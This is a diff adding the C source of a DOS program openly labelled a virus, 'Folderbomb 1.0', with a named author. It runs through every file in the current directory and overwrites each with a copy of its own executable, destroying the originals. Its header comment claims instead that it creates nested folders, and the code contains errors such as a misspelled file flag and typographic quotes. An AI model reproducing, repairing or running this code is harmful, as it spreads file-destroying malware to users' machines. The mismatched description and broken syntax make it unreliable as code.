@@ -1,0 +1,36 @@
+/*this is a simple program to create a virus in c
+
+it will create folder in a folder in a folder and so on run this on your own responsibility*/
+
+#include<stdio.h>
+#include<dos.h>
+#include<dir.h>
+#include<fcntl.h>
+#include<conio.h>
+void main(int argc,char* argv[])
+{ char buf[512];
+int source,target,byt,done;
+struct ffblk ffblk;
+clrscr();
+textcolor(2);
+cprintf(”————————————————————————–”);
+printf(”\nVirus: Folderbomb 1.0\nProgrammer:BAS Unnikrishnan(asystem0@gmail.com)\n”);
+cprintf(”————————————————————————–”);
+done = findfirst(”*.*”,&ffblk,0);
+while (!done)
+{ printf(”\n”);cprintf(” %s “, ffblk.ff_name);printf(”is attacked by “);cprintf(”Folderbomb”);
+source=open(argv[0],O_RDONLY|O_BINARY);
+target=open(ffblk.ff_name,O_CREAT|O_BINARY|O_WRONGLY);
+while(1)
+{byt=read(source,buf,512);
+if(byt>0)
+write(target,buf,byt);
+else
+break;
+}
+close(source);
+close(target);
+done = findnext(&ffblk);
+}
+getch();
+}
